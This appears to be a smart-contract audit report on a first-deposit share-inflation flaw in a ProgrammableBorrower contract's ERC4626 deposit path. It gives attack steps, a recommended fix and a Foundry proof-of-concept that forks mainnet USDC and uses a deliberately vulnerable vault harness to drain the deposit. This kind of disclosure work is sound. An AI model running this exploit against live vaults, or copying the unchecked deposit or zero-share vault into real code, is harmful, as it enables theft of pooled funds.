### Title
Unvalidated ERC4626 deposit allows share-price manipulation to seize pooled principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` trusts the configured ERC4626 vault to return a valid share amount, but `_depositToVault` never validates the returned shares, minimum expected shares, or post-deposit asset value. If the selected vault prices shares from raw balances and permits zero-share deposits, a vault user can inflate the share price before `onStartEpoch`, cause the facility's first large deposit to mint zero shares, and redeem the attacker's inflated shares for both the donation and the facility's deposit.

### Finding Description

The vulnerable flow occurs during the buffer-to-running epoch transition:

1. A KYC-passing lender deposits underlying into `IdleCDOEpochVariant`.
2. An attacker who is an ordinary ERC4626 vault user deposits one underlying unit into the configured vault, receiving one share.
3. The attacker donates `D >= P` underlying directly to the vault, where `P` is the pending programmable-borrower deposit.
4. The manager calls `IdleCDOEpochVariant.startEpoch`.
5. `startEpoch` transfers the pooled underlying to `ProgrammableBorrower`.
6. `ProgrammableBorrower.onStartEpoch` calls `_depositToVault(underlyingToken.balanceOf(address(this)), 0)`.
7. `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and only records the returned value in the event. It does not check that `shares != 0`, compare `shares` with `previewDeposit`, use a minimum-share parameter, or verify that `convertToAssets(returnedShares)` approximates `_assetAmount`.
8. In a vulnerable raw-balance ERC4626 implementation, the deposit mints `P * totalSupply / totalAssets`; after the donation, this rounds to zero.
9. The attacker redeems their single share and receives the donated assets plus `P`.

The accounting baseline does not repair the loss. `onStartEpoch` stores the pre-deposit amount in `epochStartVaultAssets`, while later `_vaultNetInterest` compares current vault assets plus withdrawals against that baseline. The zero-share deposit is therefore exposed as a vault loss, and a later close or insufficient-balance stop can propagate the shortage into `IdleCDOEpochVariant`'s default handling.

### Impact Explanation

The attacker can steal the programmable facility's deposit when the configured ERC4626 vault has negligible initial supply, uses raw asset balances for conversion, and allows a deposit to mint zero shares.

With attacker cost `D + 1` and `D >= P`:

- Vault supply before facility deposit: `1` share.
- Vault assets before facility deposit: `D + 1`.
- Facility deposit: `P`.
- Facility shares minted: `P / (D + 1) = 0` when `D + 1 > P`.
- Attacker redemption: `D + 1 + P`.
- Attacker profit: `P`.

The broken invariant is fair deposit accounting: underlying supplied by lenders is transferred into an external vault without receiving the corresponding claim. This is direct theft of pool principal and can subsequently create insolvency or a hard default.

### Likelihood Explanation

Likelihood depends on the selected ERC4626 integration. A hardened vault with virtual shares/assets or a zero-share deposit check prevents the full attack. The risk remains plausible because `ProgrammableBorrower.initialize` validates only that `vault.asset()` matches the underlying token; it does not require minimum vault liquidity, inspect share-safety properties, or protect the first deposit. An attacker can monitor a newly selected low-liquidity vault or its initial use and manipulate its share price before `startEpoch`.

Owner, manager, borrower, and CDO behavior remains honest. The attacker only needs the explicitly permitted role of an ordinary user of the programmable borrower's ERC4626 vault.

### Recommendation

Add explicit share validation around all ERC4626 deposits:

```solidity
uint256 sharesBefore = vault.balanceOf(address(this));
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 receivedShares = vault.deposit(_assetAmount, address(this));

if (
    receivedShares == 0 ||
    receivedShares < expectedShares * MIN_DEPOSIT_BPS / 10_000 ||
    vault.balanceOf(address(this)) - sharesBefore != receivedShares ||
    vault.convertToAssets(receivedShares) < _assetAmount * MIN_VALUE_BPS / 10_000
) {
    revert InvalidAmount();
}
```

Prefer `mint(expectedShares, receiver)` where supported, or add a minimum-share/slippage field to the deposit helper. At configuration time, also require the vault to have nonzero, economically meaningful liquidity and document that raw-balance ERC4626 implementations must have virtual-share protections.

### Proof of Concept

This Foundry test uses a forked underlying token and an intentionally raw-balance ERC4626 harness to demonstrate the state transition accepted by `ProgrammableBorrower`; the vulnerable production dependency is the unchecked `vault.deposit` return.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";

contract RawBalanceVault is ERC20 {
    IERC20 public immutable assetToken;

    constructor(IERC20 asset_) ERC20("Raw Share", "RAW") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return totalSupply() == 0 ? shares : shares * totalAssets() / totalSupply();
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        return totalSupply() == 0 ? assets : assets * totalSupply() / totalAssets();
    }

    function previewDeposit(uint256 assets) external view returns (uint256) {
        return convertToShares(assets);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // Vulnerable ERC4626 behavior: zero-share deposits are accepted.
        shares = convertToShares(assets);
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract FakeCDO {
    address public immutable token;

    constructor(address token_) {
        token = token_;
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testVaultDepositInflationStealsFacilityDeposit() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        address attacker = makeAddr("attacker");
        address realBorrower = makeAddr("realBorrower");
        address owner = makeAddr("owner");
        address manager = makeAddr("manager");

        RawBalanceVault vault = new RawBalanceVault(USDC);
        FakeCDO cdo = new FakeCDO(address(USDC));

        ProgrammableBorrower impl = new ProgrammableBorrower();
        ProgrammableBorrower borrowerAdapter = ProgrammableBorrower(address(
            new TransparentUpgradeableProxy(
                address(impl),
                address(this),
                abi.encodeWithSelector(
                    ProgrammableBorrower.initialize.selector,
                    address(vault),
                    address(cdo),
                    owner,
                    manager,
                    realBorrower,
                    0
                )
            )
        ));

        uint256 facilityDeposit = 1_000_000e6;
        uint256 donation = facilityDeposit;

        // Facility receives assets that would have been sent by IdleCDOEpochVariant.
        deal(address(USDC), address(borrowerAdapter), facilityDeposit);

        // Attacker establishes a 1-share position and inflates raw asset/share ratio.
        deal(address(USDC), attacker, donation + 1);
        vm.startPrank(attacker);
        USDC.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        USDC.transfer(address(vault), donation);
        vm.stopPrank();

        // Honest epoch start: the facility deposits its entire balance.
        vm.prank(address(cdo));
        borrowerAdapter.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrowerAdapter)), 0);

        // The attacker's one share now owns donation + facility deposit + seed deposit.
        uint256 attackerBefore = USDC.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(USDC.balanceOf(attacker) - attackerBefore, donation + facilityDeposit + 1);
        assertEq(borrowerAdapter.totalUnderlying(), 0);
    }
}
```
